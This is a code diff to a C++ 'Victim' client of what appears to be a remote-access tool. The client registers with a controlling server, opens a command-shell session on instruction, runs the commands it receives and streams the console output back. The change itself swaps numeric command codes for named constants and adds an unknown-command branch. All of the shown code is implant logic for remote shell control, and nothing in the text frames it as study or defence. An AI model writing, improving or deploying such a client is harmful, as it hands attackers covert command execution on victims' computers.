@@ -1,5 +1,6 @@
 #include "victim.hpp"
 #include <thread>
+#include "../commands.hpp"
 
 Victim::Victim(std::string inHId)
 	:
@@ -29,7 +30,7 @@ int Victim::runVictimProcess()
 		p >> reqId >> cmd;
 
 		//start ssh session
-		if (cmd == uint8_t(9)) {
+		if (cmd == Cmd::START_SSH) {
 			if (cmdSession != nullptr) {
 				std::cerr << "cmd is not nullptr (unable to start session)\n";
 				continue;
@@ -49,7 +50,7 @@ int Victim::runVictimProcess()
 			isSshActive = true;
 		}
 		//end ssh session
-		else if (cmd == uint8_t(10)) {
+		else if (cmd == Cmd::END_SSH) {
 			if (cmdSession == nullptr) {
 				std::cerr << "cmd is already nullptr (unable to end session)\n";
 				continue;
@@ -64,7 +65,7 @@ int Victim::runVictimProcess()
 			sendCmdDataThread = nullptr;
 		}
 		//receive ssh data
-		else if (cmd == uint8_t(11)) {
+		else if (cmd == Cmd::SSH_DATA) {
 			std::string data;
 			p >> data;
 
@@ -74,6 +75,11 @@ int Victim::runVictimProcess()
 			}
 
 			cmdSession->sendCommand(data);
+		}
+		//unknown command
+		else {
+			std::cerr << "unknown command received: " << int(cmd) << "\n";
+			continue;
 		}
 	}
 
@@ -92,7 +98,7 @@ bool Victim::connectServer()
 	//send the registration request
 	sf::Packet req;
 	uint16_t reqId = requestId++;
-	req << reqId << std::uint8_t(3) << myHId;
+	req << reqId << std::uint8_t(Cmd::REGISTER_VICTIM) << myHId;
 	if (server.send(req) != sf::Socket::Status::Done) {
 		server.disconnect();
 		return false;
@@ -146,7 +152,7 @@ void Victim::sendCmdData()
 		std::string output;
 		if (cmdSession->readConsoleOutput(output)) {
 			sf::Packet res;
-			res << uint16_t(0) << uint8_t(11) << output;
+			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << output;
 			auto _ = server.send(res);
 		}
 	}
